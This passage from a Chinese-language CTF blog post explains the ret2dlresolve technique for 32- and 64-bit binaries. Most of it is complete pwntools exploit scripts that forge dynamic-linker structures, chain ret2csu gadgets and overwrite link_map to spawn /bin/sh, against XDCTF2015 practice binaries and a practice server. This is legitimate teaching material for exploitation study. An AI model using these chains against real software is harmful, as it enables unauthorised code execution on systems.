class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line"><span class="comment"># print(rop.dump())</span></span><br><span class="line"><span class="comment"># sleep(2)</span></span><br><span class="line">sl(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>rop.migrate(new_stack)的结果</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">pop ebp; ret的gadget</span><br><span class="line">new_stack-size_t</span><br><span class="line">leave; ret的gadget</span><br></pre></td></tr></table></figure>

<p>最终会在rsp为new_stack时进行ret，所以需要事先在new_stack布置好要rop的内容</p>
</blockquote>
<h3 id="pwntools工具"><a href="#pwntools工具" class="headerlink" title="pwntools工具"></a>pwntools工具</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./main_partial_relro_32&quot;</span>)</span><br><span class="line">rop = ROP(context.binary)</span><br><span class="line">db = lambda x : gdb.attach(io,x)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line">rop.read(<span class="number">0</span>,dlresolve.data_addr,<span class="number">0x100</span>)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line">print(rop.dump())</span><br><span class="line">io = process(<span class="string">&quot;./main_partial_relro_32&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;b *0x804853A&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>)</span><br><span class="line">padding=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload=padding+raw_rop</span><br><span class="line">io.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(dlresolve.payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>dlresolve.data_addr一般就是我们伪造ELFdyn sys str的bss地址 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>],data_addr=来指定伪造地址)</span><br></pre></td></tr></table></figure>

<p>print(rop.dump())</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[*] Loaded <span class="number">10</span> cached gadgets <span class="keyword">for</span> <span class="string">&#x27;./main_partial_relro_32&#x27;</span></span><br><span class="line"><span class="number">0x0000</span>:        <span class="number">0x8048390</span> read(<span class="number">0</span>, <span class="number">0x804ae00</span>, <span class="number">0x400</span>)</span><br><span class="line"><span class="number">0x0004</span>:        <span class="number">0x804836a</span> &lt;adjust @<span class="number">0x14</span>&gt; add esp, <span class="number">8</span>; pop ebx; ret</span><br><span class="line"><span class="number">0x0008</span>:              <span class="number">0x0</span> arg0</span><br><span class="line"><span class="number">0x000c</span>:        <span class="number">0x804ae00</span> arg1</span><br><span class="line"><span class="number">0x0010</span>:            <span class="number">0x400</span> arg2</span><br><span class="line"><span class="number">0x0014</span>:        <span class="number">0x8048370</span> [plt_init] system(<span class="number">0x804ae24</span>)</span><br><span class="line"><span class="number">0x0018</span>:           <span class="number">0x2af8</span> [dlresolve index]</span><br><span class="line"><span class="number">0x001c</span>:          b<span class="number">&#x27;</span>haaa<span class="number">&#x27;</span> &lt;system <span class="keyword">return</span> address&gt;</span><br><span class="line"><span class="number">0x0020</span>:        <span class="number">0x804ae24</span> system arg0</span><br></pre></td></tr></table></figure>

<h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><h3 id="NO-RELRO-1"><a href="#NO-RELRO-1" class="headerlink" title="NO-RELRO"></a>NO-RELRO</h3><p>只能用ret2csu来控制rdx</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000400750</span> <span class="number">4</span>C <span class="number">89</span> FA                      mov     rdx, r15</span><br><span class="line">.text:<span class="number">0000000000400753</span> <span class="number">4</span>C <span class="number">89</span> F6                      mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400756</span> <span class="number">44</span> <span class="number">89</span> EF                      mov     edi, r13d</span><br><span class="line">.text:<span class="number">0000000000400759</span> <span class="number">41</span> FF <span class="number">14</span> DC                   call    ds:(__frame_dummy_init_array_entry - <span class="number">6008F</span>8h)[r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">0000000000400759</span></span><br><span class="line">.text:<span class="number">000000000040075</span>D <span class="number">48</span> <span class="number">83</span> C3 <span class="number">01</span>                   add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400761</span> <span class="number">48</span> <span class="number">39</span> DD                      cmp     rbp, rbx</span><br><span class="line">.text:<span class="number">0000000000400764</span> <span class="number">75</span> EA                         jnz     <span class="type">short</span> loc_400750</span><br><span class="line">.text:<span class="number">0000000000400764</span></span><br><span class="line">.text:<span class="number">0000000000400766</span></span><br><span class="line">.text:<span class="number">0000000000400766</span>                               loc_400766:                             ; CODE XREF: __libc_csu_init+<span class="number">34</span>↑j</span><br><span class="line">.text:<span class="number">0000000000400766</span> <span class="number">48</span> <span class="number">83</span> C4 <span class="number">08</span>                   add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040076</span>A <span class="number">5B</span>                            pop     rbx</span><br><span class="line">.text:<span class="number">000000000040076B</span> <span class="number">5</span>D                            pop     rbp</span><br><span class="line">.text:<span class="number">000000000040076</span>C <span class="number">41</span> <span class="number">5</span>C                         pop     r12</span><br><span class="line">.text:<span class="number">000000000040076</span>E <span class="number">41</span> <span class="number">5</span>D                         pop     r13</span><br><span class="line">.text:<span class="number">0000000000400770</span> <span class="number">41</span> <span class="number">5</span>E                         pop     r14</span><br><span class="line">.text:<span class="number">0000000000400772</span> <span class="number">41</span> <span class="number">5F</span>                         pop     r15</span><br><span class="line">.text:<span class="number">0000000000400774</span> C3                            retn</span><br></pre></td></tr></table></figure>

<p>和32位一样，伪造一个将read改为system的dynstr到bss，将dynmic的dynstr地址改为伪造到bss的dynstr，将参数rdi覆盖为binsh，rop到read的plt第二条指令触发_dl_runtime_resolve，执行system</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main_no_relro_64&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;28808&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)  </span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">csu_front_addr = <span class="number">0x400750</span></span><br><span class="line">csu_end_addr = <span class="number">0x40076A</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2csu</span>(<span class="params">func,a1,a2,a3,return_ad</span>):</span><br><span class="line">    rbx=<span class="number">0</span></span><br><span class="line">    rbp=<span class="number">1</span></span><br><span class="line">    r12=func</span><br><span class="line">    r13=a1</span><br><span class="line">    r14=a2</span><br><span class="line">    r15=a3</span><br><span class="line">    payload = p64(csu_end_addr)</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload+=<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>+p64(return_ad)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">    </span><br><span class="line">db(<span class="string">&#x27;b *0x040063C&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;read&quot;</span>,<span class="string">b&quot;system&quot;</span>)</span><br><span class="line"><span class="comment">#stack mrigrate to new_stack栈迁移</span></span><br><span class="line">bss_ad=elf.bss()+<span class="number">0x200</span></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">start=elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">120</span></span><br><span class="line">rop.raw(padding)</span><br><span class="line">rop.raw(ret2csu(read_got,<span class="number">0</span>,bss_ad,<span class="built_in">len</span>(dynstr+<span class="string">b&#x27;\x00/bin/sh\x00&#x27;</span>),start))</span><br><span class="line">s(rop.chain().ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">s(dynstr+<span class="string">b&#x27;\x00/bin/sh\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">dynmic_dynstr=<span class="number">0x600988</span>+<span class="number">8</span></span><br><span class="line">poprdi=<span class="number">0x0400773</span></span><br><span class="line">payload=padding+ret2csu(read_got,<span class="number">0</span>,dynmic_dynstr,<span class="number">8</span>,start)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">s(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">s(p64(bss_ad))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">read_plt=<span class="number">0x400516</span></span><br><span class="line">padding=<span class="string">b&#x27;d&#x27;</span>*<span class="number">120</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">ret=<span class="number">0x00000000004004c6</span></span><br><span class="line">payload=padding+p64(poprdi)+p64(bss_ad+<span class="built_in">len</span>(dynstr)+<span class="number">1</span>)+p64(ret)+p64(read_plt)</span><br><span class="line">s(payload)</span><br><span class="line"><span class="comment"># # b()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Partial-RELRO-1"><a href="#Partial-RELRO-1" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><p>和32为基本上差不多，在 64 位下，plt 中的代码 push 的是待解析符号在重定位表中的索引，而不是偏移。</p>
<p><img src="/2023/07/09/ret2dlresolve/image-20230724174219575.png" alt="image-20230724174219575"></p>
<p>Versym: 0x4003f6指向版本号数组，符号表索引，同时为版本号索引 导致，version index addr指向不存在内存，导致解析时错误</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取符号的版本信息, dl_fixup 的代码</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX(DT_VERSYM)] != <span class="literal">NULL</span>)<span class="comment">//l为link_map结构体</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum = (<span class="type">const</span> <span class="type">void</span> *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);</span><br><span class="line">ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line"><span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> &#123;</span></span><br><span class="line">    Elf64_Addr l_addr;</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *l_name;</span><br><span class="line"> </span><br><span class="line">    Elf64_Dyn *l_ld;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_prev</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"> </span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line"> </span><br><span class="line">    Elf64_Dyn *l_info[<span class="number">76</span>];  <span class="comment">//l_info 里面包含的就是动态链接的各个表的信息</span></span><br><span class="line">    ...</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> l_tls_firstbyte_offset;</span><br><span class="line"> </span><br><span class="line">    <span class="type">ptrdiff_t</span> l_tls_offset;</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> l_tls_modid;</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> l_tls_dtor_count;</span><br><span class="line"> </span><br><span class="line">    Elf64_Addr l_relro_addr;</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> l_relro_size;</span><br><span class="line"> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> l_serial;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">auditstate</span> <span class="title">l_audit</span>[];</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们需要把linkmap的l_info[VERSYMIDX(DT_VERSYM)]写为0来绕过执行</p>
<p>linkmap为got表的第二项，l_info[VERSYMIDX(DT_VERSYM)]为linkmap偏移0x1c8处</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main_partial_relro_64&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;28808&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)  </span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;b *0x40066C&#x27;</span>)</span><br><span class="line">csu_front_addr = <span class="number">0x00400780</span></span><br><span class="line">csu_end_addr = <span class="number">0x0040079A</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2csu</span>(<span class="params">func,a1,a2,a3,return_ad</span>):</span><br><span class="line">    rbx=<span class="number">0</span></span><br><span class="line">    rbp=<span class="number">1</span></span><br><span class="line">    r12=func</span><br><span class="line">    r13=a1</span><br><span class="line">    r14=a2</span><br><span class="line">    r15=a3</span><br><span class="line">    payload = p64(csu_end_addr)</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload+=<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>+p64(return_ad)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rela.plt&#x27;</span>).header.sh_addr</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rel_plt))</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">padding=<span class="string">b&#x27;d&#x27;</span>*<span class="number">120</span></span><br><span class="line"><span class="built_in">print</span>(rop.dump())</span><br><span class="line">p(<span class="string">&#x27;dlresolve.data_addr&#x27;</span>,dlresolve.data_addr)</span><br><span class="line">start=elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">got_0=<span class="number">0x0601008</span></span><br><span class="line"><span class="comment">#泄露linkmap导致</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">payload=padding+ret2csu(write_got,<span class="number">1</span>,got_0,<span class="number">8</span>,start)</span><br><span class="line">s(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">link_map_addr =uu64(r(<span class="number">6</span>))</span><br><span class="line">p(<span class="string">&#x27;link_map_addr&#x27;</span>,link_map_addr)</span><br><span class="line"><span class="comment">#linkmap-&gt;l_info[VERSYMIDX(DT_VERSYM)]即linkmap偏移0x1c8处写入0</span></span><br><span class="line">payload=padding+ret2csu(read_got,<span class="number">0</span>,link_map_addr+<span class="number">0x1c8</span>,<span class="number">8</span>,start)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">s(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">payload=padding+ret2csu(read_got,<span class="number">0</span>,dlresolve.data_addr,<span class="number">0x100</span>,start)</span><br><span class="line">s(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(dlresolve.payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">payload=padding+rop.chain()</span><br><span class="line">s(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2dlresolve"><span class="toc-number">1.</span> <span class="toc-text">ret2dlresolve</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#32%E4%BD%8D"><span class="toc-number">1.1.</span> <span class="toc-text">32位</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NO-RELRO"><span class="toc-number">1.1.1.</span> <span class="toc-text">NO-RELRO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Partial-RELRO"><span class="toc-number">1.1.2.</span> <span class="toc-text">Partial RELRO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwntools%E5%B7%A5%E5%85%B7"><span class="toc-number">1.1.3.</span> <span class="toc-text">pwntools工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64%E4%BD%8D"><span class="toc-number">1.2.</span> <span class="toc-text">64位</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NO-RELRO-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">NO-RELRO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Partial-RELRO-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">Partial RELRO</span></a></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/07/09/ret2dlresolve/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/07/09/ret2dlresolve/&text=ret2dlresolve"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/07/09/ret2dlresolve/&title=ret2dlresolve"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/07/09/ret2dlresolve/&is_video=false&description=ret2dlresolve"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ret2dlresolve&body=Check out this article: https://grxer.gitee.io/2023/07/09/ret2dlresolve/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/07/09/ret2dlresolve/&title=ret2dlresolve"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/07/09/ret2dlresolve/&title=ret2dlresolve"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/07/09/ret2dlresolve/&title=ret2dlresolve"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/07/09/ret2dlresolve/&title=ret2dlresolve"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/07/09/ret2dlresolve/&name=ret2dlresolve&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/07/09/ret2dlresolve/&t=ret2dlresolve"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023
    bxz
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?a22ef0bec4e4a9c7337bea6e37ff55c1";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
